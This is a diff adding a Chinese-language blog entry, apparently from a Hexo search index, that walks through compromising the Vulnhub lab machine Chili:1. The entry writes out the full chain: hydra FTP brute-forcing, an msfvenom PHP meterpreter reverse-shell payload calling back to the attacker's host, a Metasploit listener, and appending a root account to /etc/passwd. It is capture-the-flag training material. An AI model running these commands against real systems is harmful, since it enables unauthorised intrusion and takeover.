@@ -6337,4 +6337,75 @@ $res=unserialize(@$select);
         <category>hexo</category>
       </categories>
   </entry>
+  <entry>
+    <title>Vulnhub靶场练习</title>
+    <url>/2021/06/17/Vulnhub%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
+    <content><![CDATA[<h2 id="Chili-1"><a class="header-anchor" href="#Chili-1">¶</a>Chili:1</h2>
+<h3 id="环境搭建"><a class="header-anchor" href="#环境搭建">¶</a>环境搭建</h3>
+<p><a href="https://www.vulnhub.com/entry/chili-1,558/">https://www.vulnhub.com/entry/chili-1,558/</a></p>
+<p>下载https://download.vulnhub.com/chili/Chili.ova  然后右键用vmware打开即可</p>
+<p>我这里使用的nat模式连接</p>
+<h3 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.94.197&#x2F;24</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210617123905206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -O -p-  192.168.94.247</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210617124251872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>发现开启了 21 ftp端口</p>
+<h3 id="正式开始"><a class="header-anchor" href="#正式开始">¶</a>正式开始</h3>
+<p>访问 ip的 80端口  发现啥也没有</p>
+<p>看到提示</p>
+<ul>
+<li>Hint : “If you ever get stuck, try again with the name of the lab”</li>
+</ul>
+<p>感觉是爆破ftp 获得密码</p>
+<p>账号就用提示的 chili</p>
+<p>密码脚本用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l chili -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -f -V ftp:&#x2F;&#x2F;192.168.94.247</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210617141246613.png" alt="在这里插入图片描述"></p>
+<p>发现了密码</p>
+<p>直接ftp登录吧</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ftp 192.168.94.247</span><br></pre></td></tr></table></figure>
+<p>然后用 msf拿个shell</p>
+<p>进入网站根目录，发现有隐藏文件，且.nano是具有最高权限的目录文件，考虑在该目录下传入木马</p>
+<p>先生成木马</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;192.168.94.197 LPORT&#x3D;2233 -f raw  &gt; shell.php</span><br></pre></td></tr></table></figure>
+<p>然后将该木马传到靶机的.nano目录下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">put &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;shell.php  aa.php</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210617151500436.png" alt="在这里插入图片描述"></p>
+<p>目前aa.php没有可执行权限，给它赋予最高权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 aa.php</span><br></pre></td></tr></table></figure>
+<p>成功上传后，这里我们通过msf反弹shell，在kali端口开启端口监听，然后通过浏览器访问我们的木马：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter_reverse_tcp</span><br><span class="line">set LHOST 192.168.94.197</span><br><span class="line">set LPORT 2233</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>可以看到建立连接了</p>
+<p><img src="https://img-blog.csdnimg.cn/20210617151252649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>然后进入shell模式</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
+<p>切换交互式shell</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure>
+<p>看了看自己权限</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data</span><br></pre></td></tr></table></figure>
+<p>上传一个linux提权脚本</p>
+<p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20210617152517849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>使用ftp 上传</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">put  &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;privilege-escalation-awesome-scripts-suite-master&#x2F;privilege-escalation-awesome-scripts-suite-master&#x2F;linPEAS&#x2F;linpeas.sh  &#x2F;var&#x2F;www&#x2F;html&#x2F;.nano&#x2F;a.sh</span><br></pre></td></tr></table></figure>
+<p>然后再msf 终端  执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;a.sh</span><br></pre></td></tr></table></figure>
+<p>发现/etc/passwd对于其他用户有写的权限，这里我们可以直接添加一个高权限用户进去：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt salt l1yee</span><br><span class="line">$1$salt$6GXvLeiShroUP6WTte.ny&#x2F;</span><br><span class="line">echo &#39;salt:$1$salt$6GXvLeiShroUP6WTte.ny&#x2F;:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39;&gt;&gt;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2021061715224489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>然后</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su salt</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210617153511955.png" alt="在这里插入图片描述"></p>
+<p>成功获取 root权限</p>
+<p>参:<a href="https://www.cnblogs.com/zzjdbk/p/14096084.html">https://www.cnblogs.com/zzjdbk/p/14096084.html</a></p>
+<p><a href="https://www.cnblogs.com/sym945/p/13723537.html">https://www.cnblogs.com/sym945/p/13723537.html</a></p>
+<p><a href="https://blog.csdn.net/qq_42967398/article/details/108928297">https://blog.csdn.net/qq_42967398/article/details/108928297</a></p>
+<p><a href="https://blog.csdn.net/qq_40549070/article/details/108926099">https://blog.csdn.net/qq_40549070/article/details/108926099</a></p>
+]]></content>
+      <categories>
+        <category>刷题站</category>
+        <category>vulhub</category>
+      </categories>
+  </entry>
 </search>
